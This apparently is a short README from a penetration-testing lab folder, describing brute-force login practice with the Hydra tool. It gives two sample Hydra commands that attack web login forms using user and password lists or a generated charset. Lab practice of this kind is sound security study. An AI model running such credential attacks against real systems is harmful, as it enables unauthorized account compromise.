# Hydra Attacks Lab  
This folder contains terminal screenshots, commands, and notes for brute force login attempts using Hydra.

## ✅ Sample Command
hydra -L users.txt -P pass.txt 192.168.1.5 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
## ✅ Sample Command
hydra -v -V -l XXXXXX -x 6:6:a1 -f -v example.com http-get /user/login.php
